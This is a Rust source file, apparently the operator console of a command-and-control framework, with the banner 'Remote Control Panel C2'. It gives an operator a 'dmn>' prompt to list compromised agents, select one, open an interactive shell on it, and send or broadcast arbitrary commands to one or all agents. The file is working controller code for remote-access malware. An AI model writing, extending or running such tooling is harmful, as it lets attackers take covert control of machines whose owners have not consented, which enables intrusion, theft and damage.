use operator::broadcast_command::broadcast_command;
use operator::interactive_shell::interactive_shell;
use operator::list_agents::list_agents;
use operator::send_command::send_command;
use reqwest::Client;
use std::collections::HashMap;
use std::io::{self, Write};
use std::time::Duration;
use tracing::{error, info};
use crate::utils::{print_banner, print_help};

#[path = "../utils.rs"]
mod utils;

#[path = "../operator/mod.rs"]
mod operator;

#[path = "../types.rs"]
mod types;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    tracing_subscriber::fmt::init();
    print_banner();
    println!("Remote Control Panel C2. Type 'help' for commands.");
    let client = Client::builder()
        .timeout(Duration::from_secs(30))
        .build()
        .map_err(|e| format!("Error creating HTTP client: {}", e))?;
    let mut selected_agent: Option<String> = None;
    let mut current_agent_cwds: HashMap<String, String> = HashMap::new();

    loop {
        print!("dmn> ");
        io::stdout()
            .flush()
            .map_err(|e| format!("Error flushing stdout: {}", e))?;
        let mut input = String::new();
        io::stdin()
            .read_line(&mut input)
            .map_err(|e| format!("Error reading input: {}", e))?;
        let input = input.trim().to_lowercase();

        match input.as_str() {
            "" => continue,
            "help" => print_help(),
            "list" => {
                list_agents(&client, true).await?;
            }
            s if s.starts_with("use ") => {
                let index_str = s.trim_start_matches("use ").trim();
                let index = match index_str.parse::<usize>() {
                    Ok(idx) => idx,
                    Err(_) => {
                        error!("Invalid index.");
                        continue;
                    }
                };
                let agents = list_agents(&client, false).await?;
                selected_agent = agents.get(index).map(|a| a.uuid.clone());
                match &selected_agent {
                    Some(uuid) => info!("Selected agent: {}", uuid),
                    None => error!("Invalid index."),
                }
            }
            "interact" => match &selected_agent {
                Some(uuid) => interactive_shell(&client, uuid, &mut current_agent_cwds).await?,
                None => error!("No agent selected."),
            },
            s if s.starts_with("send ") => match &selected_agent {
                Some(uuid) => {
                    let cmd = s.trim_start_matches("send ").trim();
                    send_command(&client, uuid, cmd, true).await?;
                }
                None => error!("No agent selected."),
            },
            s if s.starts_with("send-async ") => match &selected_agent {
                Some(uuid) => {
                    let cmd = s.trim_start_matches("send-async ").trim();
                    send_command(&client, uuid, cmd, false).await?;
                }
                None => error!("No agent selected."),
            },
            s if s.starts_with("broadcast ") => {
                let cmd = s.trim_start_matches("broadcast ").trim();
                broadcast_command(&client, cmd, true).await?;
            }
            s if s.starts_with("broadcast-async ") => {
                let cmd = s.trim_start_matches("broadcast-async ").trim();
                broadcast_command(&client, cmd, false).await?;
            }
            "clear" => {
                if cfg!(target_os = "windows") {
                    std::process::Command::new("cls")
                        .status()
                        .map_err(|e| format!("Error clearing screen: {}", e))?;
                } else {
                    std::process::Command::new("clear")
                        .status()
                        .map_err(|e| format!("Error clearing screen: {}", e))?;
                }
            }
            "exit" | "quit" => break,
            _ => error!("Unknown command: {}. Type 'help' for help.", input),
        }
    }
    Ok(())
}
